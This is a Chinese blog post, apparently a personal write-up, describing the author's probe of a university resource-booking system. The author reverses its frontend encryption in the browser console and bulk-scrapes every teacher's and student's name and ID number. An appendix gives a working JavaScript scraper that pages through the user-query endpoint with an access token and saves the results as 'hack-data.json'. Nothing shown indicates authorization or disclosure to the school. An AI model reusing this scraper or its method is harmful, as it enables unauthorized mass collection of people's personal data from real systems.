@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>L校资源预约系统渗透测试 | wuhulamb’s blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="L校资源预约系统渗透测试" />
+<meta name="author" content="wuhulamb" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Kein System ist sicher. （没有绝对安全的系统）" />
+<meta property="og:description" content="Kein System ist sicher. （没有绝对安全的系统）" />
+<meta property="og:site_name" content="wuhulamb’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-04-26T10:48:00+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="L校资源预约系统渗透测试" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wuhulamb"},"dateModified":"2025-04-26T10:48:00+08:00","datePublished":"2025-04-26T10:48:00+08:00","description":"Kein System ist sicher. （没有绝对安全的系统）","headline":"L校资源预约系统渗透测试","mainEntityOfPage":{"@type":"WebPage","@id":"/blog/p/hack-in-lzu-cgyy/"},"url":"/blog/p/hack-in-lzu-cgyy/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/blog/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="/blog/feed.xml" title="wuhulamb&apos;s blog" />
+
+<link rel="icon" type="image/png" href="/blog/favicon/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/svg+xml" href="/blog/favicon/favicon.svg" />
+<link rel="shortcut icon" href="/blog/favicon/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/blog/favicon/apple-touch-icon.png" />
+<link rel="manifest" href="/blog/favicon/site.webmanifest" />
+
+<link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.6.0/css/all.min.css" rel="stylesheet">
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/blog/">wuhulamb&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/blog/category/">Category</a><a class="page-link" href="/blog/links/">Links</a><a class="page-link" href="/blog/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">L校资源预约系统渗透测试</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2025-04-26T10:48:00+08:00" itemprop="datePublished">
+        2025-04-26
+      </time>
+				| <span><a href="/blog/category/computer/">计算机</a></span>
+				</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <blockquote>
+  <p>Kein System ist sicher. （没有绝对安全的系统）</p>
+</blockquote>
+
+<p>自笔者上次发现<a href="https://wuhulamb.pages.dev/blog/2024/06/23/first-hack-lzu-library/" target="_blank">L校图书馆毕业纪念网站的安全问题</a>后，很长时间都没有什么新的发现了…… 直到某天，ZZR在L校的APP上发现资源预约系统可以查看所有在校师生的姓名、工号等敏感信息，然后将这一发现分享给了我，于是一个种子播下了.</p>
+
+<h2 id="初次尝试">初次尝试</h2>
+
+<p>我找到了该资源预约系统的网页端，F12 打开开发者工具，找到相关数据的请求包.</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/008kbRJbly1i0vl8a9m5cj31fj0suwxk.jpg" alt="lzu-cgyy-index.jpg" />
+<figcaption>简单测试发现网页数据是该post请求返回的</figcaption>
+</figure>
+
+<p>首先是这个post请求的url最后的参数非常奇怪，再点击response会发现不是网页中显示的数据，而是很长的一串字符，request同样是一串很长的字符。笔者非常果断地放弃了……</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/008kbRJbly1i0vl8ab4i1j31fj0su7m5.jpg" alt="lzu-cgyy-response.jpg" />
+<figcaption>奇怪的response</figcaption>
+</figure>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/008kbRJbly1i0vl8ac8oaj31fj0sutqm.jpg" alt="lzu-cgyy-request.jpg" />
+<figcaption>奇怪的request</figcaption>
+</figure>
+
+<h2 id="two-thousand-years-later-">Two thousand years later …</h2>
+
+<p>某天，WJY说总是预约不上羽毛球场，问我能不能写一个一键预约脚本用于该系统，我说有难度……</p>
+
+<p>回到宿舍，我又打开了那个网站，因为没有思路，然后又默默地❌掉了……</p>
+
+<hr />
+
+<p>前面铺垫这么久，就是想突出一下这次渗透测试的难度嘿嘿。下面开始正文！</p>
+
+<h2 id="存在加密">存在加密</h2>
+
+<p>网页显示的数据一定就是post请求的response，而显示的结果是明文，说明一定存在解密过程，而且一定是在前端解密的（后端解密就没有加密的必要了😅），那一定就可以找到解密部分的代码！</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/008kbRJbly1i0vl8a11tgj31fg0swqep.jpg" alt="lzu-cgyy-encrypt.jpg" />
+<figcaption>搜索encrypt，发现可疑代码</figcaption>
+</figure>
+
+<p>笔者在源代码搜索栏中尝试了 <code class="language-plaintext highlighter-rouge">crypto</code> , <code class="language-plaintext highlighter-rouge">encrypt</code> 等关键字，定位加密代码部分。搜不到也可以将代码文件逐个点一遍，关键是要坚信前端一定有解密的代码.</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/008kbRJbly1i0vl8a88yij31fh0su7lm.jpg" alt="lzu-cgyy-encrypt-function.jpg" />
+<figcaption>发现解密代码</figcaption>
+</figure>
+
+<p>果然，没花多长时间，笔者就找到了解密的代码，在浏览器控制台运行decodeResult函数，成功解密！</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/008kbRJbly1i0vl8au702j31fg0su7wi.jpg" alt="lzu-cgyy-decode-response.jpg" />
+<figcaption>成功解密post请求的response数据</figcaption>
+</figure>
+
+<p>这时候，自然会用这个函数试一下解密requset的数据.</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/008kbRJbly1i0vl8au0awj31fh0sv7wi.jpg" alt="lzu-cgyy-decode-request.jpg" />
+<figcaption>成功解密post请求的request数据</figcaption>
+</figure>
+
+<h2 id="post请求的url参数是个什么鬼">post请求的url参数是个什么鬼？</h2>
+
+<p>笔者第一次遇到这么奇怪的url参数，延续上面的想法，起初以为这个参数也是加密后的结果，可是死活找不到加密的代码，按照上面加密过程反向解密也不行，然后就卡在这里了……</p>
+
+<p>不过，post请求是从前端发到后端的，意味着url也是前端生成的，那么一定能在前端找到生成它的代码.</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/008kbRJbly1i0vl8asixqj31fj0sve81.jpg" alt="lzu-cgyy-stack-trace.jpg" />
+<figcaption>post请求的生成堆栈</figcaption>
+</figure>
+
+<p>在AI君的帮助下，笔者一点一点读完了这些打包混淆的代码，找到了一个关键的代码片段.</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/008kbRJbly1i0vl8a8fnuj31fj0swdus.jpg" alt="lzu-cgyy-key-code.jpg" />
+<figcaption>发出post请求的关键代码</figcaption>
+</figure>
+
+<p>经调试，post请求的url在发出时，没有后面的奇怪参数，且request也没有加密，而且笔者第二天发出相同request请求却得到不同的url参数，于是猜测这个url参数是动态生成的，可能是依据token和cookie生成的。（弄清这个url参数真的是花了很长时间，最后是在控制台构造了一个post请求发出后成功返回了数据才确认了这个请求过程）</p>
+
+<p>（所以实际上post请求的url就是 <code class="language-plaintext highlighter-rouge">https://example.com/hzsun-resm/sys/user/queryUserByConfitionPage</code> ，请求头加上 <code class="language-plaintext highlighter-rouge">X-Access-Token</code> 参数，结合请求头的cookie发出post请求时，浏览器Network显示的url就自动加上了那个奇怪的令牌参数）</p>
+
+<h2 id="爬取数据">爬取数据</h2>
+
+<p>最后就是快乐地爬取数据环节.（当然是用控制台爬取，浏览器控制台自动处理请求头带上cookie真的太方便了）</p>
+
+<p>一开始笔者按照常规爬取思路，准备按页爬取保存，后来发现浏览器每次保存需手动点击确认，就将每页爬取的数据合并再一次保存下来.</p>
+
+<h2 id="学到了什么">学到了什么</h2>
+
+<ul>
+  <li>浏览器控制台爬数据不要太爽，javascript值得一学！</li>
+  <li>感觉Google Chrome的Console和Debugger比Firefox要正常<del>，也有可能是我误点了什么</del>（同样的post请求构造，Firefox返回400，Chrome正常返回response数据；起先Firefox也是正常返回，后来就一直返回400，我找了好长时间原因，最后在Chrome上发post请求完全正常）</li>
+  <li>浏览器Private窗口操作，关闭所有Private窗口后，所有缓存都会被清除</li>
+  <li>AI君真是最强搭档，本次渗透的代码有95%均为AI君完成，剩下5%是笔者细致入微的提问和耐心的等待（什么时候deepseek不再出现服务器繁忙啊啊啊）</li>
+</ul>
+
+<h2 id="浏览器post请求显示的request为什么是加密的">（❓）浏览器post请求显示的request为什么是加密的</h2>
+
+<p>post请求发出后，前端的request拦截函数做的加密（笔者水平有限，猜测过程是这样的）</p>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/008kbRJbly1i0vl8asramj31fh0swb29.jpg" alt="lzu-cgyy-interceptors-stack-trace.jpg" />
+<figcaption>post请求生成堆栈中的request拦截函数</figcaption>
+</figure>
+
+<figure>
+<img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/008kbRJbly1i0vl8adimzj31fi0sw7ko.jpg" alt="lzu-cgyy-interceptors.jpg" />
+<figcaption>request拦截函数代码</figcaption>
+</figure>
+
+<h2 id="附录js代码">（附录）js代码</h2>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://example.com/hzsun-resm/sys/user/queryUserByConfitionPage</span><span class="dl">"</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">EXAMPLEopeyJ0e02jfXAiOiJKV1QixxLCJhbGciOiJIUzIpjafds1NiJ9.eyJleHAiOjE3N1lIjoiMzIwMjEw9fjadsOTQ4MjUxIn0.24XCcXb5HZJ1Rrw4YTYC4w1Qrgv3AQ</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nf">runBrowser</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">total</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span> <span class="c1">// 根据实际情况确认总页数</span>
+  <span class="kd">const</span> <span class="nx">batchSize</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="kd">const</span> <span class="nx">allData</span> <span class="o">=</span> <span class="p">[];</span> <span class="c1">// 存储所有响应数据</span>
+
+  <span class="k">async</span> <span class="kd">function</span> <span class="nf">sendRequest</span><span class="p">(</span><span class="nx">offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">payload</span> <span class="o">=</span> <span class="p">{</span> 
+      <span class="dl">"</span><span class="s2">limit</span><span class="dl">"</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">offset</span><span class="dl">"</span><span class="p">:</span> <span class="nx">offset</span><span class="p">,</span>
+      <span class="dl">"</span><span class="s2">userIdList</span><span class="dl">"</span><span class="p">:</span> <span class="p">[],</span>
+      <span class="dl">"</span><span class="s2">excludeRoleId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span> 
+      <span class="dl">"</span><span class="s2">roleId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span> 
+      <span class="dl">"</span><span class="s2">orgId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span> 
+      <span class="dl">"</span><span class="s2">realname</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span> 
+      <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span> 
+      <span class="dl">"</span><span class="s2">userTypeCode</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span>
+    <span class="p">};</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> 
+        <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+          <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
+          <span class="dl">'</span><span class="s1">X-Access-Token</span><span class="dl">'</span><span class="p">:</span> <span class="nx">token</span>
+        <span class="p">},</span>
+        <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span>
+      <span class="p">});</span>
+
+      <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">ok</span><span class="p">)</span> <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="s2">`HTTP错误! 状态码: </span><span class="p">${</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+      
+      <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">response</span><span class="p">.</span><span class="nf">json</span><span class="p">();</span>
+      <span class="nx">allData</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nf">decodeResult</span><span class="p">(</span><span class="nx">data</span><span class="p">)[</span><span class="dl">'</span><span class="s1">responseResult</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">rows</span><span class="dl">'</span><span class="p">]);</span> <span class="c1">// 将响应数据存入数组</span>
+
+    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`Offset </span><span class="p">${</span><span class="nx">offset</span><span class="p">}</span><span class="s2"> 失败:`</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="c1">// 分批发送请求</span>
+  <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">total</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">batchSize</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">promises</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&lt;</span> <span class="nx">batchSize</span> <span class="o">&amp;&amp;</span> <span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span> <span class="o">&lt;=</span> <span class="nx">total</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">promises</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nf">sendRequest</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="nx">j</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">await</span> <span class="nb">Promise</span><span class="p">.</span><span class="nf">all</span><span class="p">(</span><span class="nx">promises</span><span class="p">);</span>
+    <span class="k">await</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="mi">1000</span><span class="p">));</span> <span class="c1">// 批次间隔</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="c1">// 创建并下载合并后的文件</span>
+  <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">allData</span><span class="p">)],</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span> <span class="p">});</span>
+  <span class="kd">const</span> <span class="nx">downloadUrl</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">link</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">downloadUrl</span><span class="p">;</span>
+  <span class="nx">link</span><span class="p">.</span><span class="nx">download</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">hack-data.json</span><span class="dl">'</span><span class="p">;</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">link</span><span class="p">);</span>
+  <span class="nx">link</span><span class="p">.</span><span class="nf">click</span><span class="p">();</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">link</span><span class="p">);</span>
+  <span class="nx">URL</span><span class="p">.</span><span class="nf">revokeObjectURL</span><span class="p">(</span><span class="nx">downloadUrl</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// 启动抓取</span>
+<span class="nf">runBrowser</span><span class="p">();</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/blog/p/hack-in-lzu-cgyy/" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/blog/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+				<p>Copyright &copy; 2024 wuhulamb</p>
+				<p>Powered by <a href="https://jekyllrb.com" target="_blank" rel="nofollow">Jekyll</a> | Theme is <a href="https://github.com/jekyll/minima/" target="_blank" rel="nofollow">Minima</a></p>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
